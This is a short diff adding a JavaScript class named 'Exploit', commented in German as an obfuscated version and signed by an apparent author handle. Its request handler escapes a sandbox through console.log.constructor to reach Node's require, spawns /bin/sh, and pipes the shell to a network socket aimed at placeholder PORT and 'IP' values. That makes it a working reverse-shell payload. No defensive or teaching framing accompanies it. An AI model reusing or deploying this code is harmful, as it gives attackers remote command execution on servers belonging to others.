@@ -1,0 +1,20 @@
+// Verschleierte Version
+
+class Exploit {
+  process_incoming_request({ request }) {
+    const a = console.log.constructor('return process.mainModule.require')();
+    const { execSync } = a('child_process');
+    var b = a("net"),
+        c = a("child_process"),
+        d = c.spawn("/bin/sh", []);
+    var e = new b.Socket();
+    e.connect(PORT, "IP", function(){
+        e.pipe(d.stdin);
+        d.stdout.pipe(e);
+        d.stderr.pipe(e);
+    });
+    return {}
+  }
+}
+
+//By DaUfooo 2025
